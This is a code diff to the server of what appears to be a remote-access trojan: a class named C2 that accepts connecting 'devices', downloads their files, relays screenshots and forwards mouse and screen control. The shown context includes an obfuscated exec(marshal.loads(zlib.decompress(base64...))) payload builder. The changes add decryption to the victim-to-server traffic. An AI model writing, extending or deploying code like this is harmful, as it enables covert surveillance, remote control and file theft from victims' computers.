@@ -99,6 +99,7 @@ class C2:
         return environ.get("HTTP_X_FORWARDED_FOR", "").split(",")[0].strip() or None
 
     def on_connect(self, sid, data):
+        data = json.loads(self.keys.decrypt(data))
         print(f"New device connected with sid {sid}")
 
         environ = self.sio.get_environ(sid)
@@ -383,6 +384,7 @@ exec(marshal.loads(zlib.decompress(base64.b64decode({repr(base64.b64encode(zlib.
             self.sio.emit("download_file", {"uid": uid, "file_path": file_path})
 
     def save_file(self, sid, data):
+        data = json.loads(decrypt(data))
         if not os.path.isdir("files_saved"):
             os.makedirs("files_saved")
 
@@ -414,7 +416,7 @@ exec(marshal.loads(zlib.decompress(base64.b64decode({repr(base64.b64encode(zlib.
 
     def screenshot_taken(self, sid, data):
         print(sid)
-        self.sio.emit("screenshot", data)
+        self.sio.emit("screenshot", json.loads(decrypt(data)))
 
     def switch_screen(self, sid, data):
         self.sio.emit("switch_screen", data)
@@ -441,7 +443,7 @@ exec(marshal.loads(zlib.decompress(base64.b64decode({repr(base64.b64encode(zlib.
         self.sio.emit("mouse_click_right", data)
 
     def screen_count(self, sid, data):
-        self.sio.emit("screen_count", data)
+        self.sio.emit("screen_count", json.loads(self.keys.decrypt(data)))
 
     def change_screen_number(self, sid, data):
         self.sio.emit("change_screen_number", data)
